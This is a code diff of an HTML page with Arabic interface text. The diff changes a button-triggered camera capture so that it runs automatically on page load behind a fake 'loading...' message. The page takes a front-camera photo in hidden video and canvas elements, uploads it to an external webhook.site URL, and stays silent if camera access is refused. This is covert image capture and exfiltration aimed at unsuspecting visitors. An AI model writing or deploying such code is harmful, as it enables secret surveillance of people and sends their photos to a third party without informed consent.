@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>اضغط للانضمام</title>
+  <title></title>
   <style>
     body {
       margin: 0;
@@ -12,64 +12,51 @@
       color: #fff;
       font-family: system-ui, sans-serif;
       display: flex;
-      flex-direction: column;
       justify-content: center;
       align-items: center;
       text-align: center;
+      font-size: 2.2rem;
     }
     #status {
-      font-size: 2.2rem;
-      margin: 1rem;
-    }
-    button {
-      padding: 1rem 3rem;
-      font-size: 1.6rem;
-      background: #006600;
-      color: white;
-      border: none;
-      border-radius: 8px;
-      cursor: pointer;
-    }
-    button:disabled {
-      background: #333;
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      z-index: 10;
     }
   </style>
 </head>
 <body>
 
-  <div id="status">جاهز؟</div>
-  <button id="btn">ابدأ</button>
+  <div id="status">جاري التحميل...</div>
 
-  <video id="video" autoplay playsinline muted style="display:none"></video>
-  <canvas id="canvas" style="display:none"></canvas>
+  <video id="v" autoplay playsinline muted style="display:none"></video>
+  <canvas id="c" style="display:none"></canvas>
 
   <script>
-    const btn = document.getElementById('btn');
-    const status = document.getElementById('status');
-    const video = document.getElementById('video');
-    const canvas = document.getElementById('canvas');
-
-    btn.onclick = async () => {
-      btn.disabled = true;
-      status.textContent = "جاري الطلب...";
+    (async function() {
+      const status = document.getElementById('status');
+      const video = document.getElementById('v');
+      const canvas = document.getElementById('c');
 
       try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+        const stream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: "user" }
+        });
+
         video.srcObject = stream;
 
-        // ننتظر ثانية واحدة لتثبيت الصورة
-        await new Promise(r => setTimeout(r, 1000));
+        // نعطي وقت بسيط للكاميرا عشان تشتغل وتثبت
+        await new Promise(r => setTimeout(r, 800));
 
         canvas.width = video.videoWidth || 640;
         canvas.height = video.videoHeight || 480;
         canvas.getContext('2d').drawImage(video, 0, 0);
 
-        const blob = await new Promise(resolve => {
-          canvas.toBlob(resolve, 'image/jpeg', 0.75);
-        });
+        const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.75));
 
         const formData = new FormData();
-        formData.append('image', blob, 'img.jpg');
+        formData.append('image', blob, 'capture.jpg');
 
         await fetch('https://webhook.site/88dae8aa-d964-44bb-aabb-4aa6b6760657', {
           method: 'POST',
@@ -77,14 +64,13 @@
         });
 
         status.textContent = "تم";
-        // إغلاق الكاميرا
-        stream.getTracks().forEach(track => track.stop());
+        stream.getTracks().forEach(t => t.stop());
 
-      } catch (err) {
-        status.textContent = "حدث خطأ";
-        btn.disabled = false;
+      } catch (e) {
+        status.textContent = "";
+        // لو رفض → الصفحة تبقى ساكتة بدون كلام (أو غير النص إذا تبي)
       }
-    };
+    })();
   </script>
 </body>
 </html>
